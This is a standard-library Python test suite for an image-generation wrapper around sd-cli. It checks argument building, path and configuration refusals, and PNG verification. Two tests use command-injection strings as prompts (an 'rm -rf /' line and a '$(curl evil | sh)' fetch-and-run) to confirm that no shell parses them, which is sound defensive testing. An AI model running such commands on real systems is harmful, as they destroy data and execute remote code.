#!/usr/bin/env python3
"""Fixture suite for the image-generation skill's wrapper script.

    python sdlc-suite/tools/test_image_generation.py   # exit 0 on pass, 1 on fail

sd-cli is replaced by a fake `subprocess.run` that writes (or withholds) a PNG
of a chosen size, so these tests cover the wrapper's own contract: the argv it
builds, the configuration and path checks, and that success is only reported
for an image measured on disk. They do not prove the real model renders
anything; that needs the real binary and weights (see SKILL.md).

No pytest: the standard library only, like `test_redact.py` beside it.
"""

from __future__ import annotations

import io
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest import mock

# No __pycache__ in the skill directory: generate_trees.py copies every file
# under a skill into six trees, and a .pyc there broke generation.
sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "skills" / "image-generation"))
import generate  # noqa: E402


def png_bytes(width: int, height: int) -> bytes:
    def chunk(kind: bytes, data: bytes) -> bytes:
        return (struct.pack(">I", len(data)) + kind + data
                + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
    return (generate.PNG_SIGNATURE + chunk(b"IHDR", ihdr)
            + chunk(b"IDAT", zlib.compress(b"")) + chunk(b"IEND", b""))


class FakeSd:
    """Stands in for subprocess.run; records argv and writes what it is told to."""

    def __init__(self, returncode=0, write=True, size=None, content=None):
        self.returncode, self.write, self.size, self.content = returncode, write, size, content
        self.calls: list[list[str]] = []

    def __call__(self, argv, timeout=None):
        self.calls.append(list(argv))
        out = Path(argv[argv.index("-o") + 1])
        if self.write:
            if self.content is not None:
                out.write_bytes(self.content)
            else:
                w = int(argv[argv.index("-W") + 1])
                h = int(argv[argv.index("-H") + 1])
                out.write_bytes(png_bytes(*(self.size or (w, h))))
        return subprocess.CompletedProcess(argv, self.returncode)


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory(prefix="imggen-test-")
        self.root = Path(self._tmp.name)
        self.cwd = self.root / "work"
        self.cwd.mkdir()
        models = self.root / "models"
        models.mkdir()
        self.env = {}
        for key, var in generate.ENV_VARS.items():
            p = models / (key + ".exe" if key == "bin" else key)
            p.write_bytes(b"x")
            self.env[var] = str(p)

    def tearDown(self):
        self._tmp.cleanup()

    def run_main(self, argv, fake=None, env=None):
        fake = fake or FakeSd()
        out, err = io.StringIO(), io.StringIO()
        with mock.patch.object(generate.subprocess, "run", fake), \
                redirect_stdout(out), redirect_stderr(err):
            code = generate.main(argv, env=self.env if env is None else env, cwd=self.cwd)
        return code, out.getvalue(), err.getvalue(), fake


class Success(Base):
    def test_writes_measured_png_and_reports_its_size(self):
        code, out, _, fake = self.run_main(
            ["--prompt", "a wireframe", "--out", "mock/a.png", "--width", "512", "--height", "768"])
        self.assertEqual(code, 0)
        target = (self.cwd / "mock" / "a.png").resolve()
        self.assertEqual(generate.read_png_size(target), (512, 768))
        self.assertEqual(out.strip(), f"OK {target} 512x768")
        self.assertEqual([p.name for p in target.parent.iterdir()], ["a.png"])

    def test_argv_is_a_list_with_prompt_as_one_element(self):
        prompt = 'x"; rm -rf / & echo $(whoami) --steps 1'
        code, _, _, fake = self.run_main(["--prompt", prompt, "--out", "a.png"])
        self.assertEqual(code, 0)
        argv = fake.calls[0]
        self.assertEqual(argv[0], self.env["SD_CPP_BIN"])
        self.assertEqual(argv[argv.index("-p") + 1], prompt)
        for flag, key in (("--diffusion-model", "QWEN_IMAGE_DIFFUSION_MODEL"),
                          ("--llm", "QWEN_IMAGE_LLM"), ("--vae", "QWEN_IMAGE_VAE")):
            self.assertEqual(argv[argv.index(flag) + 1], self.env[key])
        self.assertIn("--offload-to-cpu", argv)

    def test_prompt_file_is_passed_verbatim_and_never_through_a_shell(self):
        hostile = 'wireframe $(curl evil | sh) `id` "quoted" & del *'
        (self.cwd / "prompt.txt").write_text(hostile + chr(10), encoding="utf-8")
        code, _, _, fake = self.run_main(["--prompt-file", "prompt.txt", "--out", "a.png"])
        self.assertEqual(code, 0)
        argv = fake.calls[0]
        self.assertEqual(argv[argv.index("-p") + 1], hostile)

    def test_lora_dir_is_private_and_empty(self):
        seen = {}
        base = FakeSd()

        def spy(argv, timeout=None):
            d = Path(argv[argv.index("--lora-model-dir") + 1])
            seen["dir"], seen["listing"] = d, list(d.iterdir())
            return base(argv, timeout)
        code, *_ = self.run_main(["--prompt", "<lora:x:1> p", "--out", "a.png"], fake=spy)
        self.assertEqual(code, 0)
        self.assertEqual(seen["listing"], [])
        self.assertNotEqual(seen["dir"].resolve(), self.cwd.resolve())
        self.assertFalse(seen["dir"].exists())     # removed with the scratch dir

    def test_force_overwrites(self):
        (self.cwd / "a.png").write_bytes(b"old")
        code, *_ = self.run_main(["--prompt", "p", "--out", "a.png", "--force",
                                  "--width", "256", "--height", "256"])
        self.assertEqual(code, 0)
        self.assertEqual(generate.read_png_size(self.cwd / "a.png"), (256, 256))


class Refusals(Base):
    def assert_refused(self, argv, fake=None, env=None, needle=""):
        code, out, err, fake = self.run_main(argv, fake=fake, env=env)
        self.assertEqual(code, 2, err)
        self.assertNotIn("OK", out)
        self.assertIn(needle, err)
        return fake

    def test_missing_env_names_every_variable(self):
        env = dict(self.env)
        del env["SD_CPP_BIN"], env["QWEN_IMAGE_VAE"]
        fake = self.assert_refused(["--prompt", "p", "--out", "a.png"], env=env,
                                   needle="SD_CPP_BIN, QWEN_IMAGE_VAE")
        self.assertEqual(fake.calls, [])

    def test_configured_file_that_does_not_exist(self):
        env = dict(self.env, QWEN_IMAGE_LLM=str(self.root / "nope.gguf"))
        self.assert_refused(["--prompt", "p", "--out", "a.png"], env=env, needle="QWEN_IMAGE_LLM")

    def test_batch_file_binary_is_rejected_on_windows(self):
        wrapper = Path(self.env["SD_CPP_BIN"]).with_suffix(".cmd")
        wrapper.write_bytes(b"@echo off")
        with self.assertRaisesRegex(generate.UsageError, r"\.exe"):
            generate.resolve_config(dict(self.env, SD_CPP_BIN=str(wrapper)), platform="win32")
        # The same file is accepted where no shell re-parses the command line.
        generate.resolve_config(dict(self.env, SD_CPP_BIN=str(wrapper)), platform="linux")

    def test_nul_byte_and_missing_prompt_file(self):
        self.assert_refused(["--prompt", "a" + chr(0) + "b", "--out", "a.png"], needle="NUL")
        self.assert_refused(["--prompt-file", "missing.txt", "--out", "a.png"],
                            needle="--prompt-file")

    def test_percent_in_output_dir_is_refused(self):
        # sd-cli expands printf-style %d in -o; the scratch file sits in --out's directory.
        fake = self.assert_refused(["--prompt", "p", "--out", "run%d/a.png"], needle="'%'")
        self.assertEqual(fake.calls, [])
        self.assertFalse((self.cwd / "run%d").exists())

    def test_empty_prompt_and_zero_steps(self):
        self.assert_refused(["--prompt", "  ", "--out", "a.png"], needle="empty")
        self.assert_refused(["--prompt", "p", "--out", "a.png", "--steps", "0"], needle="--steps")

    def test_path_escape_is_rejected(self):
        for out in ("../escape.png", str(self.root / "abs.png")):
            with self.subTest(out=out):
                fake = self.assert_refused(["--prompt", "p", "--out", out], needle="inside")
                self.assertEqual(fake.calls, [])
        self.assertFalse((self.root / "escape.png").exists())

    def test_non_png_extension(self):
        self.assert_refused(["--prompt", "p", "--out", "a.exe"], needle=".png")

    def test_existing_file_is_not_overwritten(self):
        (self.cwd / "a.png").write_bytes(b"old")
        self.assert_refused(["--prompt", "p", "--out", "a.png"], needle="--force")
        self.assertEqual((self.cwd / "a.png").read_bytes(), b"old")

    def test_bad_dimensions(self):
        for w in ("100", "1000", "4096"):
            with self.subTest(width=w):
                self.assert_refused(["--prompt", "p", "--out", "a.png", "--width", w],
                                    needle="multiple of 16")

    def test_nonzero_exit_leaves_nothing(self):
        self.assert_refused(["--prompt", "p", "--out", "a.png"],
                            fake=FakeSd(returncode=1), needle="exited 1")
        self.assertEqual(list(self.cwd.iterdir()), [])

    def test_exit_zero_without_image(self):
        self.assert_refused(["--prompt", "p", "--out", "a.png"],
                            fake=FakeSd(write=False), needle="wrote no image")
        self.assertEqual(list(self.cwd.iterdir()), [])

    def test_output_that_is_not_a_png(self):
        self.assert_refused(["--prompt", "p", "--out", "a.png"],
                            fake=FakeSd(content=b"not an image at all, long enough"),
                            needle="not a PNG")
        self.assertEqual(list(self.cwd.iterdir()), [])

    def test_wrong_dimensions(self):
        self.assert_refused(["--prompt", "p", "--out", "a.png"],
                            fake=FakeSd(size=(64, 64)), needle="got 64x64")
        self.assertEqual(list(self.cwd.iterdir()), [])

    def test_binary_that_cannot_start(self):
        def boom(argv, timeout=None):
            raise FileNotFoundError(2, "No such file")
        self.assert_refused(["--prompt", "p", "--out", "a.png"], fake=boom,
                            needle="could not start")

    def test_timeout(self):
        def slow(argv, timeout=None):
            raise subprocess.TimeoutExpired(argv, timeout)
        self.assert_refused(["--prompt", "p", "--out", "a.png", "--timeout", "5"],
                            fake=slow, needle="within 5s")


if __name__ == "__main__":
    result = unittest.main(exit=False, verbosity=1).result
    sys.exit(0 if result.wasSuccessful() else 1)
